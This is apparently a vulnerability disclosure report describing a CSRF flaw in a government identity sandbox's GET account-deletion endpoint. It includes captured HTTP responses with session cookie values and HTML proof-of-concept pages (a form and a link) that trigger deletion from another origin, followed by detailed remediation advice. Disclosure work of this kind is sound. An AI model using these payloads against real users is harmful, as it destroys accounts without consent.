

## Summary

**Vulnerability:** Cross-Site Request Forgery (CSRF) — destructive action implemented as a `GET` endpoint.  
**Target:** `https://identite-sandbox.proconnect.gouv.fr/users/delete`  
**Impact:** An attacker can trick a logged-in user into performing an account deletion/termination action simply by visiting or clicking a link on an attacker-controlled page. Cookies are set with `SameSite=Lax`, which does **not** block top-level `GET` navigations, so a top-level GET (form navigation / link click) from another origin will include the victim’s session cookie and trigger the action.  
**Severity:** High (destructive action affecting user account availability / integrity).  
**Suggested CVSSv3.1 (estimated):** `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` → **8.8 (High)**

---

## Evidence (captured responses)

**Login response that sets session cookies**

```
HTTP/2 302 Found
Date: Mon, 15 Sep 2025 21:23:10 GMT
...
Set-Cookie: trusted-browser=s%3A10134.wOSitLLpYLSBFE7rxIhwwx2BtPctZ%2F63W%2FWQ41R8HAc; Max-Age=7776000; Path=/; Expires=Sun, 14 Dec 2025 21:23:10 GMT; HttpOnly; Secure; SameSite=Lax
Set-Cookie: session=s%3A4SIUcwS7yc1ghACdtSc-q0lBKae_bFd1.nTTsuKlacIPgdFjIy%2Fn%2BmxNDyxCaV%2Bua%2BAfmHzzaFmQ; Path=/; Expires=Tue, 16 Sep 2025 21:23:10 GMT; HttpOnly; Secure; SameSite=Lax
Location: /users/personal-information
```

**Unauthenticated request to delete endpoint (your earlier test)**

```
GET /users/delete? HTTP/2
Host: identite-sandbox.proconnect.gouv.fr
Cookie: session=...; trusted-browser=...
Referer: https://identite-sandbox.proconnect.gouv.fr/connection-and-account
...
HTTP/2 302 Found
...
Set-Cookie: session=...; Path=/; Expires=Tue, 16 Sep 2025 21:21:40 GMT; HttpOnly; Secure; SameSite=Lax
Location: /users/start-sign-in
```

> Notes: The server sets `session` and `trusted-browser` cookies on login (SameSite=Lax). A top-level cross-site GET navigation will include these cookies, enabling CSRF if the endpoint performs deletion for authenticated users.

---

## Reproduction steps (can be used as PoC)

> Only test on accounts or targets you are authorized to test.

1. Log in to `https://identite-sandbox.proconnect.gouv.fr` using a valid user account (so `session` cookie is present).
    
2. Open a new tab and visit the following attacker-controlled page (or paste into a local file and open it):
    

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>CSRF PoC — Manual trigger</title></head>
<body>
  <h3>CSRF PoC — Manual trigger</h3>
  <p>Click the button below (while logged in to the target) to perform a top-level GET to the delete endpoint.</p>
  <form id="csform" action="https://identite-sandbox.proconnect.gouv.fr/users/delete" method="GET" target="_top">
    <button type="button" id="triggerBtn">Trigger delete (click when logged in)</button>
  </form>
  <script>
    document.getElementById('triggerBtn').addEventListener('click', function () {
      document.getElementById('csform').submit();
    });
  </script>
</body>
</html>
```

3. Click **Trigger delete**. Because the form causes a top-level navigation, the browser will include `SameSite=Lax` cookies and perform the GET request to `/users/delete`. If the server performs deletion without confirmation, the account will be deleted or deletion will be initiated.
    

**Alternative PoC (link):**

```html
<a href="https://identite-sandbox.proconnect.gouv.fr/users/delete" target="_top">Click me</a>
```

A simple link click will also send the session cookie because of `SameSite=Lax`.

---

## Impact

- An attacker who can persuade a victim to click a link or visit a page could delete or disrupt the victim’s account.
    
- Loss of data, account denial of service, potential for account takeover chains if deletion triggers other flows.
    
- Reputational and support costs for the service (support tickets, account recovery).
    

---

## Remediation / Recommended fixes (ordered by priority)

1. **Change the HTTP method**: Do **not** perform destructive actions on `GET`. Require `POST` (or `DELETE` with proper CSRF protections) for account deletion endpoints.
    
2. **Require a CSRF token for state-changing requests**: Use synchronized token (per-session/per-request) and validate server-side for all state-modifying actions. Tokens must be present in requests and validated server-side (e.g., in request body/header for POST).
    
3. **Require explicit, irreversible confirmation for destructive actions**:
    
    - Add a server-side confirmation step (re-enter password, or provide current password, or OTP) before performing account deletion.
        
    - Or require the user to click a form button on the site itself (not via link), where the site includes a server-validated CSRF token and a confirmation UI.
        
4. **Harden cookie policy**:
    
    - Consider `SameSite=Strict` for session cookies if it doesn't break legitimate flows — this prevents cookies on any cross-site navigations.
        
    - If `Lax` is required for login flows, ensure server-side defenses exist (CSRF tokens, require POST + re-auth).
        
5. **Validate Origin/Referer headers server-side** for state-changing requests. Reject cross-origin requests for sensitive actions unless other CSRF protections are present.
    
6. **Log and alert** attempts to call destructive endpoints from unexpected sources and rate-limit such actions.
    
7. **User-facing changes**: Show an explicit confirmation page for irreversible actions and send an email/notification to the user when deletion is requested/processed, with clear recovery steps.
    
8. **Security review and test**: Re-run CSRF test cases after remediation; include automated tests to prevent regressions.
    

---

## Detection & mitigation notes

- Automated scanners should flag `GET /users/delete` as risky. Manual verification should confirm whether an authenticated GET causes deletion.
    
- Ensure any cached redirect or auth flow doesn't mask the real behavior for authenticated users during testing.
    
- After remediation, test by attempting cross-site top-level GET, POST w/o token, missing/invalid Origin header, and confirm server rejects.
    

---

